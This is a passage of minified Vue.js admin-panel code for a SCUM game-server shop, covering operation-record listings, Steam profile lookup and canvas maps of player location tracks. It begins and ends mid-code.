11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingAdminRecordListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()}}},Xa=Object(S.a)(Va,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"商城后台操作记录"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAdminRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAdminRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者商城用户ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.adminRecordListFilter.userId,callback:function(t){e.$set(e.adminRecordListFilter,"userId",t)},expression:"adminRecordListFilter.userId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录模块:")]),i("a-select",{staticStyle:{width:"270px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.adminRecordListFilter.module,callback:function(t){e.$set(e.adminRecordListFilter,"module",t)},expression:"adminRecordListFilter.module"}},e._l(e.moduleList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[i("a-tooltip",{attrs:{title:t}},[e._v(e._s(t))])],1)})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("记录说明:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.adminRecordListFilter.description,callback:function(t){e.$set(e.adminRecordListFilter,"description",t)},expression:"adminRecordListFilter.description"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.adminRecordListFilter.timestampStart,e.adminRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.adminRecordListFilter,"timestampStart",t[0]),e.$set(e.adminRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.adminRecordListColumns,"data-source":e.adminRecordListData,expandedRowKeys:e.expandedAdminRecordIds,"row-key":"id",pagination:!1,loading:e.loadingAdminRecordListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedAdminRecordIds.find((function(e){return e===i.id}))&&e.expandedAdminRecordIds.push(i.id);else{var a=Object.keys(e.expandedAdminRecordIds).find((function(t){return e.expandedAdminRecordIds[t]===i.id}));void 0!==a&&e.expandedAdminRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"userId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[a.adminRecordUser&&a.adminRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.adminRecordUser.userName}})}}},[e._v(e._s(a.adminRecordUser.userName))]):e._e()]}},{key:"module",fn:function(t,a){return[i("a-tag",{attrs:{color:"green"}},[e._v(" "+e._s(void 0!==e.moduleList.find((function(e){return e.value===a.module}))?e.moduleList.find((function(e){return e.value===a.module})).label:a.module)+" ")])]}},{key:"description",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedAdminRecordIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedAdminRecordIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedAdminRecordIds.find((function(e){return e===a.id}))&&e.expandedAdminRecordIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedAdminRecordIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("详细信息")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.description)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.description.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.adminRecordListPagination.pageSize,current:e.adminRecordListPagination.pageNum,total:e.adminRecordListPagination.total},on:{change:e.onChangeAdminRecordListPagination,showSizeChange:e.onShowSizeChangeAdminRecordListPagination}})],1)])],1)}),[],!1,null,"3c14dbbb",null).exports,Za={name:"SteamInfoSearch",components:{Loading:w,SteamInfo:ae},data:function(){return{steamId:"",searched:!1,loading:!1,steamInfo:{status:null,steamId:"",personaname:"",avatarFull:"",profileUrl:"",timeCreated:0,playerLevel:1,lastPlayTime:0,playHours:0,vacBanned:!1,communityBanned:!1,economyBan:"none",numberOfVACBans:0,numberOfGameBans:0,daysSinceLastBan:0}}},mounted:function(){},methods:{search:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(null!==e.steamId&&D(e.steamId)&&17===e.steamId.length){t.next=3;break}return e.$message.error("Steam ID 格式不正确"),t.abrupt("return");case 3:return e.searched=!0,e.loading=!0,i={steamId:e.steamId},t.prev=6,t.next=9,f({method:"GET",url:"/userAdminSys/getSteamInfo",params:i});case 9:200===(a=t.sent).status?(void 0!==(null==a||null===(n=a.data)||void 0===n?void 0:n.results)?e.steamInfo=Object(s.a)(Object(s.a)({},null==a||null===(r=a.data)||void 0===r?void 0:r.results),{},{status:null}):e.steamInfo.status=null==a?void 0:a.msg,e.loading=!1):(e.$message.error(a.message),e.loading=!1),t.next=17;break;case 13:t.prev=13,t.t0=t.catch(6),console.error(t.t0),e.loading=!1;case 17:case"end":return t.stop()}}),t,null,[[6,13]])})))()}}},Wa=Object(S.a)(Za,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"580px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"580px",position:"absolute"}},[e._m(0),i("div",{staticStyle:{margin:"10px 0"}},[i("a-input",{staticStyle:{width:"250px"},model:{value:e.steamId,callback:function(t){e.steamId=t},expression:"steamId"}}),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary"},on:{click:e.search}},[e._v("查询")])],1),e.searched?i("steam-info",{attrs:{"steam-info":e.steamInfo}}):e._e()],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)}),[function(){var e=this.$createElement,t=this._self._c||e;return t("div",[t("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[this._v("*请输入17位Steam ID，查询前请确认已经在”配置管理→服务器管理“配置Steam API 密钥")])])}],!1,null,"6dae4fd6",null).exports,Qa={name:"PlayerLocationMap",props:{locationList:{type:Array}},computed:Object(s.a)(Object(s.a)({},Object(v.mapState)(["scumMapBorder","scumMapImageObject"])),{},{combineAll:function(){return[this.locationList,this.scumMapBorder,this.scumMapImageObject]}}),mounted:function(){var e=this;window.addEventListener("resize",(function(){var t=document.getElementById("outer-frame").offsetWidth,i=e.scumMapBorder?(e.scumMapBorder.yMax-e.scumMapBorder.yMin)/(e.scumMapBorder.xMax-e.scumMapBorder.xMin):1;console.log(i),e.measuredWidth=t>=800?800:t,e.measuredHeight=t>=800?800*i:t*i,e.$nextTick((function(){e.drawMap()}))}),!1)},data:function(){return{moment:R.a,measuredWidth:0,measuredHeight:0,computedXY:[],clickTargetConfig:{}}},methods:{reCompute:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.showWholeMap=!1,i=document.getElementById("outer-frame").offsetWidth,a=e.scumMapBorder?(e.scumMapBorder.yMax-e.scumMapBorder.yMin)/(e.scumMapBorder.xMax-e.scumMapBorder.xMin):1,console.log(a),e.measuredWidth=i>=800?800:i,e.measuredHeight=i>=800?800*a:i*a,e.$nextTick((function(){e.drawMap()}));case 7:case"end":return t.stop()}}),t)})))()},drawMapInit:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,new Promise((function(t){var i=setInterval((function(){void 0!==e.$refs.map&&(clearInterval(i),t())}),100)}));case 2:e.drawMap();case 3:case"end":return t.stop()}}),t)})))()},drawMap:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,l,c,d,u,p,m,g,h;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,new Promise((function(t){var i=setInterval((function(){void 0!==e.$refs.map&&(clearInterval(i),t())}),100)}));case 2:i=e.$refs.map,(a=i.getContext("2d")).clearRect(0,0,i.width,i.height),i.width=e.measuredWidth,i.height=e.measuredHeight,a.drawImage(e.scumMapImageObject,0,0,e.measuredWidth,e.measuredHeight),n={},r=Object(we.a)(e.locationList);try{for(r.s();!(o=r.n()).done;)l=o.value,void 0===n[l.steamId]&&(n[l.steamId]=[]),n[l.steamId].push(l)}catch(e){r.e(e)}finally{r.f()}for(d in c=[],n){for(n[d]=n[d].sort((function(e,t){return e.recordTimeStamp-t.recordTimeStamp})),u=null,p=0;p<n[d].length;p++)m={x:(e.scumMapBorder.xMax-n[d][p].x)*e.measuredWidth/(e.scumMapBorder.xMax-e.scumMapBorder.xMin),y:(e.scumMapBorder.yMax-n[d][p].y)*e.measuredHeight/(e.scumMapBorder.yMax-e.scumMapBorder.yMin)},c.push(Object(s.a)({mapX:m.x,mapY:m.y},n[d][p])),null!==u&&(a.strokeStyle="lightblue",a.lineWidth=3,console.log(0,u.x,u.y),console.log(1,m.x,m.y),a.beginPath(),a.moveTo(u.x,u.y),a.lineTo(m.x,m.y),a.stroke()),u=m;for(g=0;g<n[d].length;g++)h={x:(e.scumMapBorder.xMax-n[d][g].x)*e.measuredWidth/(e.scumMapBorder.xMax-e.scumMapBorder.xMin),y:(e.scumMapBorder.yMax-n[d][g].y)*e.measuredHeight/(e.scumMapBorder.yMax-e.scumMapBorder.yMin)},a.globalAlpha=.55,a.fillStyle=0===g?"lightgreen":g===n[d].length-1?"yellow":"red",a.beginPath(),a.arc(h.x,h.y,12+(e.measuredWidth-800)/800*12,2*Math.PI,0,!0),a.closePath(),a.fill(),a.globalAlpha=1,a.fillStyle=0===g?"lightgreen":g===n[d].length-1?"yellow":"red",a.beginPath(),a.arc(h.x,h.y,8+(e.measuredWidth-800)/800*8,2*Math.PI,0,!0),a.closePath(),a.fill()}e.computedXY=c;case 14:case"end":return t.stop()}}),t)})))()},renderPopup:function(e){var t=document.getElementById("popup"),i=this.$refs.map,a=e.clientX-i.getBoundingClientRect().left,n=e.clientY-i.getBoundingClientRect().top,r=this.computedXY.filter((function(e){return Math.pow(e.mapX-a,2)+Math.pow(e.mapY-n,2)<=144})).map((function(e){return e.distance=Math.sqrt(Math.pow(e.mapX-a,2)+Math.pow(e.mapY-n,2)),e})).sort((function(e,t){return e.distance-t.distance}));null!=r&&r.length?(this.isClickTarget=!0,t.style.left="".concat(a-5,"px"),t.style.top="".concat(n-5,"px"),t.style.display="block",this.$set(this,"clickTargetConfig",r[0])):(this.$set(this,"clickTargetConfig",{}),t.style.display="none")}},watch:{combineAll:{immediate:!0,deep:!0,handler:function(e){var t=this,i=e[0],a=e[1],n=e[2],r=i instanceof Array&&void 0===i.find((function(e){return"number"!=typeof e.x||"number"!=typeof e.y})),o="number"==typeof a.xMax&&"number"==typeof a.xMin&&"number"==typeof a.yMax&&"number"==typeof a.yMin,s=n instanceof Image;r&&o&&s&&new Promise((function(e){var i=setInterval((function(){document.getElementById("outer-frame")&&void 0!==t.$refs.map&&(clearInterval(i),e())}),100)})).then((function(){var e=document.getElementById("outer-frame").offsetWidth,i=t.scumMapBorder?(t.scumMapBorder.yMax-t.scumMapBorder.yMin)/(t.scumMapBorder.xMax-t.scumMapBorder.xMin):1;t.measuredWidth=e>=800?800:e,t.measuredHeight=e>=800?800*i:e*i,t.drawMapInit()}))}}}},Ja=(i("c027"),{name:"PlayerLocation",components:{PlayerLocationMap:Object(S.a)(Qa,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto","text-align":"center",position:"relative"},attrs:{id:"outer-frame"}},[i("canvas",{ref:"map",staticStyle:{border:"2px #faad14 solid",position:"absolute"},style:{width:e.measuredWidth+"px",height:e.measuredHeight+"px",left:"calc(50% - "+e.measuredWidth/2+"px)"},on:{click:e.renderPopup}}),i("a-popover",[i("div",{staticStyle:{width:"400px","max-height":"800px","overflow-y":"auto"},attrs:{slot:"content"},slot:"content"},[i("div",[e._v("Steam ID: "),i("strong",[e._v(e._s(e.clickTargetConfig.steamId))])]),i("div",[e._v("位置: "),i("strong",[e._v("X="+e._s(e.clickTargetConfig.x)+" Y="+e._s(e.clickTargetConfig.y)+" Z="+e._s(e.clickTargetConfig.z))])]),i("div",[e._v("上报时间: "),i("strong",[e._v(e._s(e.clickTargetConfig.recordTimeStamp?e.moment(Number(e.clickTargetConfig.recordTimeStamp)).format("YYYY-MM-DD HH:mm:ss"):e.clickTargetConfig.recordTimeStamp))])])]),i("div",{staticStyle:{display:"none",position:"absolute",width:"10px",height:"10px",opacity:"1"},attrs:{id:"popup"}})])],1)}),[],!1,null,"107d1b24",null).exports},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,playerLocationListFilter:{steamId:void 0,timeStampStart:void 0,timeStampEnd:void 0},playerLocationListData:[],cleanLoading:!1,refreshMap:!1}},mounted:function(){this.getPlayerLocationList()},methods:{onPlayerLocationListCleanFilter:function(){var e=this;this.$nextTick((function(){e.getPlayerLocationList(!0)}))},onPlayerLocationListFilter:function(){var e=this;this.$nextTick((function(){e.getPlayerLocationList()}))},getPlayerLocationList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return e?t.playerLocationListFilter={steamId:void 0,timestampStart:void 0,timestampEnd:void 0}:(void 0!==(n=Object(A.cloneDeep)(t.playerLocationListFilter)).timestampStart&&void 0!==n.timestampEnd&&(n.timestampStart=R()(n.timestampStart).valueOf(),n.timestampEnd=R()(n.timestampEnd).valueOf()),a=Object(s.a)({},n)),i.prev=1,i.next=4,f({method:"GET",url:"/playerLocationAdminSys/list",params:a});case 4:200===(r=i.sent).status&&(t.playerLocationListData=r.data.map((function(e){var t=e.locations.split(",");return Object(s.a)({x:t[0],y:t[1],z:t[2]},e)})),t.refreshMap=!0,t.$nextTick((function(){t.refreshMap=!1,setTimeout((function(){t.$refs.map.reCompute()}),100)})),t.$message.info("可用鼠标或触屏手势放大/缩小/拖动地图")),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},cleanPlayerLocation:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/playerLocationAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getPlayerLocationList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}}),en=Object(S.a)(Ja,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空玩家轨迹数据吗"},on:{confirm:e.cleanPlayerLocation}},[i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空玩家轨迹数据")])],1)]:e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onPlayerLocationListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onPlayerLocationListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],2),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block"}},[e._v("玩家Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.playerLocationListFilter.steamId,callback:function(t){e.$set(e.playerLocationListFilter,"steamId",t)},expression:"playerLocationListFilter.steamId"}}),i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("收录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.playerLocationListFilter.timestampStart,e.playerLocationListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.playerLocationListFilter,"timestampStart",t[0]),e.$set(e.playerLocationListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-alert",{staticStyle:{"margin-bottom":"10px"},attrs:{"show-icon":"",message:"要使玩家轨迹数据正常展示，需前往【商城配置管理】-【商城和美金设置】-【可选功能开关】打开【每5分钟获取玩家位置列表】开关并使用最新版本的商城机器人。数据一般只保留几天的时间",type:"info"}}),i("div",{staticStyle:{width:"100%",height:"500px","text-align":"center"}},[i("div",{staticStyle:{width:"500px",height:"500px",display:"inline-block"}},[e.refreshMap?e._e():i("player-location-map",{ref:"map",attrs:{"location-list":e.playerLocationListData}})],1)]),e._m(0)],1)])])}),[function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticStyle:{width:"100%",height:"115px","text-align":"center","margin-top":"10px"}},[t("div",{staticStyle:{padding:"10px",display:"inline-block",width:"500px",height:"115px",border:"2px #faad14 solid",background:"#333333",color:"white"}},[t("div",{staticStyle:{height:"20px","line-height":"20px","font-weight":"bolder"}},[this._v("图例 (点击坐标点查看详情)")]),t("div",{staticStyle:{"text-align":"left",height:"24px","line-height":"24px","font-weight":"bolder"}},[t("div",{staticStyle:{transform:"translateY(3px)","vertical-align":"top",display:"inline-block",height:"18px",width:"18px",background:"lightgreen","border-radius":"18px"}}),t("span",{staticStyle:{"vertical-align":"top","margin-left":"5px"}},[this._v("某玩家范围起点")])]),t("div",{staticStyle:{"text-align":"left",height:"24px","line-height":"24px","font-weight":"bolder"}},[t("div",{staticStyle:{transform:"translateY(3px)","vertical-align":"top",display:"inline-block",height:"18px",width:"18px",background:"red","border-radius":"18px"}}),t("span",{staticStyle:{"vertical-align":"top","margin-left":"5px"}},[this._v("某玩家途经点")])]),t("div",{staticStyle:{"text-align":"left",height:"24px","line-height":"24px","font-weight":"bolder"}},[t("div",{staticStyle:{transform:"translateY(3px)","vertical-align":"top",display:"inline-block",height:"18px",width:"18px",background:"yellow","border-radius":"18px"}}),t("span",{staticStyle:{"vertical-align":"top","margin-left":"5px"}},[this._v("某玩家范围终点")])])])])}],!1,null,"1ba1d41c",null).exports,tn=!1,an=!1,nn={name:"MapSelectors",props:{value:{type:Array}},computed:Object(s.a)(Object(s.a)({},Object(v.mapState)(["scumMapBorder","scumMapImageObject"])),{},{combineAll:function(){return[this.scumMapBorder,this.scumMapImageObject]}}),mounted:function(){var e=this;window.addEventListener("resize",(function(){if(void 0!==document.getElementById("outer-frame")){var t=document.getElementById("outer-frame").offsetWidth,i=e.scumMapBorder?(e.scumMapBorder.yMax-e.scumMapBorder.yMin)/(e.scumMapBorder.xMax-e.scumMapBorder.xMin):1;console.log(i),e.measuredWidth=t>=800?800:t,e.measuredHeight=t>=800?800*i:t*i,e.$nextTick((function(){e.$emit("input",[]),e.drawMap(e.scumMapBorder,e.scumMapImageObject)}))}}),!1)},data:function(){return{measuredWidth:0,measuredHeight:0,imgX:0,imgY:0,imgScale:1,pos:{},posl:{},pos1:{},pos2:{},dragging:!1,scaling:!1}},methods:{drawMapInit:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function e(){var t,a,n,r,s,l,c,d,u,p;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.next=2,new Promise((function(e){var t=setInterval((function(){void 0!==i.$refs.map&&(clearInterval(t),e())}),100)}));case 2:t=i.$refs.map,a=function(e){i.dragging=!0,tn=!0,setTimeout((function(){tn=!1}),200),i.pos=i.windowToCanvas(e.clientX,e.clientY)},n=function(e){if(!tn&&i.dragging){i.posl=i.windowToCanvas(e.clientX,e.clientY);var t=i.posl.x-i.pos.x,a=i.posl.y-i.pos.y;i.imgX+=t,i.imgY+=a,i.pos=JSON.parse(JSON.stringify(i.posl)),i.drawMap()}},r=function(){i.dragging=!1},s=function(e){1===e.touches.length?(i.dragging=!0,i.pos=i.windowToCanvas(e.touches[0].clientX,e.touches[0].clientY)):2===e.touches.length&&(i.scaling=!0,i.pos1=i.windowToCanvas(e.touches[0].clientX,e.touches[0].clientY),i.pos2=i.windowToCanvas(e.touches[1].clientX,e.touches[1].clientY),an=!0,setTimeout((function(){an=!1}),200))},l=function(e){if(!an){if(i.dragging&&1===e.touches.length){i.posl=i.windowToCanvas(e.touches[0].clientX,e.touches[0].clientY);var t=i.posl.x-i.pos.x,a=i.posl.y-i.pos.y;i.imgX+=t,i.imgY+=a,i.pos=JSON.parse(JSON.stringify(i.posl))}else if(i.scaling&&2===e.touches.length){var n=i.pos1,r=i.pos2,o=i.windowToCanvas(e.touches[0].clientX,e.touches[0].clientY),s=i.windowToCanvas(e.touches[1].clientX,e.touches[1].clientY);i.pos=i.windowToCanvas((e.touches[0].clientX+e.touches[1].clientX)/2,(e.touches[0].clientY+e.touches[1].clientY)/2);var l={x:((i.pos.x-i.imgX)/i.imgScale).toFixed(2),y:((i.pos.y-i.imgY)/i.imgScale).toFixed(2)};(s.y-o.y)*(s.y-o.y)+(s.x-o.x)*(s.x-o.x)>=(r.y-n.y)*(r.y-n.y)+(r.x-n.x)*(r.x-n.x)?(i.imgScale+=.1,i.imgX=(1-i.imgScale)*l.x+(i.pos.x-l.x),i.imgY=(1-i.imgScale)*l.y+(i.pos.y-l.y)):(i.imgScale-=.1,i.imgScale<1&&(i.imgScale=1),i.imgX=(1-i.imgScale)*l.x+(i.pos.x-l.x),i.imgY=(1-i.imgScale)*l.y+(i.pos.y-l.y)),i.pos1=o,i.pos2=s}i.drawMap()}},c=function(){i.dragging=!1,i.scaling=!1},d=function(e){i.pos=i.windowToCanvas(e.clientX,e.clientY);var t=e.wheelDelta?e.wheelDelta:-40*e.deltalY,a=((i.pos.x-i.imgX)/i.imgScale).toFixed(2),n=((i.pos.y-i.imgY)/i.imgScale).toFixed(2);t>0?(i.imgScale+=.1,i.imgX=(1-i.imgScale)*a+(i.pos.x-a),i.imgY=(1-i.imgScale)*n+(i.pos.y-n)):(i.imgScale-=.1,i.imgScale<1&&(i.imgScale=1),i.imgX=(1-i.imgScale)*a+(i.pos.x-a),i.imgY=(1-i.imgScale)*n+(i.pos.y-n)),i.drawMap()},u=function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var a,n,r,o,s,l,c,d,u,p;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(!tn&&!an){e.next=16;break}return a=t.touches?t.touches[0]:t,n=i.windowToCanvas(a.clientX,a.clientY),r=Math.abs(i.imgX),o=Math.abs(i.imgY),s=i.measuredWidth*i.imgScale,l=i.measuredHeight*i.imgScale,c=r+n.x,d=o+n.y,u=i.scumMapBorder.xMax-(i.scumMapBorder.xMax-i.scumMapBorder.xMin)*c/s,p=i.scumMapBorder.yMax-(i.scumMapBorder.yMax-i.scumMapBorder.yMin)*d/l,i.$emit("input",[u.toFixed(3),p.toFixed(3),0]),e.next=14,i.drawMap();case 14:return e.next=16,i.drawLocation(n);case 16:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}(),t.onclick=u,t.onmousedown=a,t.onmousemove=n,t.onmouseup=r,t.ontouchstart=s,t.ontouchmove=l,t.ontouchend=c,t.onmousewheel=t.onwheel=d,p=t.getContext("2d"),t.width=i.measuredWidth,t.height=i.measuredHeight,p.drawImage(i.scumMapImageObject,0,0,i.measuredWidth,i.measuredHeight);case 23:case"end":return e.stop()}}),e)})))()},drawLocation:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:a=t.$refs.map,(n=a.getContext("2d")).globalAlpha=.75,n.fillStyle="red",n.beginPath(),n.arc(e.x,e.y,.025*t.measuredWidth,2*Math.PI,0,!0),n.closePath(),n.fill(),n.globalAlpha=.6,n.fillStyle="white",n.beginPath(),n.rect(e.x-.015*t.measuredWidth,e.y-.0025*t.measuredWidth,.03*t.measuredWidth,.005*t.measuredWidth),n.fill(),n.beginPath(),n.rect(e.x-.0025*t.measuredWidth,e.y-.015*t.measuredWidth,.005*t.measuredWidth,.03*t.measuredWidth),n.fill();case 16:case"end":return i.stop()}}),i)})))()},drawMap:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,new Promise((function(t){var i=setInterval((function(){void 0!==e.$refs.map&&(clearInterval(i),t())}),100)}));case 2:i=e.$refs.map,(a=i.getContext("2d")).clearRect(0,0,i.width,i.height),i.width=e.measuredWidth,i.height=e.measuredHeight,e.imgX<e.measuredWidth*(1-e.imgScale)?e.imgX=e.measuredWidth*(1-e.imgScale):e.imgX>0&&(e.imgX=0),e.imgY<e.measuredHeight*(1-e.imgScale)?e.imgY=e.measuredHeight*(1-e.imgScale):e.imgY>0&&(e.imgY=0),a.drawImage(e.scumMapImageObject,0,0,e.scumMapImageObject.width,e.scumMapImageObject.height,e.imgX,e.imgY,e.measuredWidth*e.imgScale,e.measuredHeight*e.imgScale);case 10:case"end":return t.stop()}}),t)})))()},windowToCanvas:function(e,t){var i=this.$refs.map.getBoundingClientRect();return{x:e-i.left-(i.width-this.$refs.map.width)/2,y:t-i.top-(i.height-this.$refs.map.height)/2}}},watch:{combineAll:{immediate:!0,deep:!0,handler:function(e){var t=this,i=e[0],a=e[1],n="number"==typeof i.xMax&&"number"==typeof i.xMin&&"number"==typeof i.yMax&&"number"==typeof i.yMin,r=a instanceof Image;n&&r&&new Promise((function(e){var i=setInterval((function(){document.getElementById("outer-frame")&&void 0!==t.$refs.map&&(clearInterval(i),e())}),100)})).then((function(){var 